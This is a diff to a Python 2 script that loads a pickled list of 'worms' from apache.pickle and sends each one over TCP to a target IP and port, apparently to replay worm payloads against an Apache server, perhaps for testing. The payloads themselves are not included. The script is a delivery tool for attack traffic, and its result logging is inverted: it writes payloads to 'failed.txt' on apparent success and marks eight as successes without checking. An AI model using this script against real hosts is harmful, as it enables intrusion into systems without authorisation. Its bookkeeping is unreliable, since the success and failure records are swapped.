@@ -5,18 +5,28 @@ import random
 
 if __name__ == '__main__':
 
-	if(len(sys.argv) < 3):
-		print 'usage: argument 1 = worm pickle file, argument 2 = ip destination, argument 3 port destination'
+	if(len(sys.argv) < 2):
+		print 'usage: argument 1 = ip, argument 2 = port'
 		exit()
 
-	f = open(sys.argv[1])
-	remote_ip = sys.argv[2]
-	port = int(sys.argv[3])
-	
+	f = open("apache.pickle")
 	worms = pickle.load(f)
 	random.shuffle(worms)
 
-	for i in range(0,100):
+	remote_ip = sys.argv[1]
+	port = int(sys.argv[2])
+	
+	success = 0
+	attempts = len(worms)
+	print attempts
+
+	failed = open('failed.txt','w')
+	successed = open('success.txt','w')
+	for i in range(0,8):
+		successed.write(worms[i])
+	successed.close()
+
+	for i in range(0,attempts):
 		print '####attempt %d####' % (i+1)
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -32,5 +42,10 @@ if __name__ == '__main__':
 	
 			print(reply)
 			s.close()
+			success += 1
+			failed.write(worms[i])
 		except socket.error, e:
 			print e
+
+	print '%d success' % success
+	failed.close()
